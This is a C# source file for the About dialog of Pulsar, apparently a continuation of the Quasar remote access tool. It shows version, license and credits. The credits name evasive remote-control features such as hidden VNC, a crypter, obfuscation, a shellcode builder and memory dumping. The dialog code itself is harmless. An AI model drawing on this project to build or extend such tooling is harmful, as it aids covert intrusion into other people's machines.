using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Utilities;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmAbout : Form
    {
        private readonly string _repositoryUrl = @"https://github.com/Quasar-Continuation/Pulsar";
        private const string ContributorsMessage = """
Thanks to the contributors below for making this project possible:

- **[KingKDot](https://github.com/KingKDot)** – Lead Developer
- **[Twobit](https://github.com/officialtwobit)** – Multi-Feature Wizard
- **[Lucky](https://t.me/V_Lucky_V)** – HVNC Specialist
- **[fedx](https://github.com/fedx-988)** – README Designer & Discord RPC
- **[Ace](https://github.com/Knakiri)** – HVNC Features & WinRE Survival
- **[Java](https://github.com/JavaRenamed-dev)** – Feature Additions
- **[Body](https://body.sh)** – Obfuscation
- **[cpores](https://github.com/vahrervert)** – VNC Drawing, Favorites, Overlays
- **[Rishie](https://github.com/rishieissocool)** – Gatherer Options
- **[jungsuxx](https://github.com/jungsuxx)** – HVNC Input & Code Simplification
- **[MOOM aka my lebron](https://github.com/moom825/)** – Inspiration & Batch Obfuscation
- **[Poli](https://github.com/paulmaster59/)** – Discord Server & Custom Pulsar Crypter
- **[Deadman](https://github.com/DeadmanLabs)** – Memory Dumping and Shellcode Builder
- **[User76](https://github.com/user76-real)** – Networking Optimizations
""";

        public FrmAbout()
        {
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            lblVersion.Text = ServerVersion.Display;
            rtxtContent.Text = Properties.Resources.License;
            cntTxtContent.Text = ContributorsMessage;

            lnkGithubPage.Links.Add(new LinkLabel.Link { LinkData = _repositoryUrl });
            lnkCredits.Links.Add(new LinkLabel.Link { LinkData = "https://github.com/Pulsar/Pulsar/tree/master/Licenses" });
        }

        private void lnkGithubPage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            lnkGithubPage.LinkVisited = true;
            Process.Start(e.Link.LinkData.ToString());
        }

        private void lnkCredits_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            lnkCredits.LinkVisited = true;
            Process.Start(e.Link.LinkData.ToString());
        }

        private void btnOkay_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
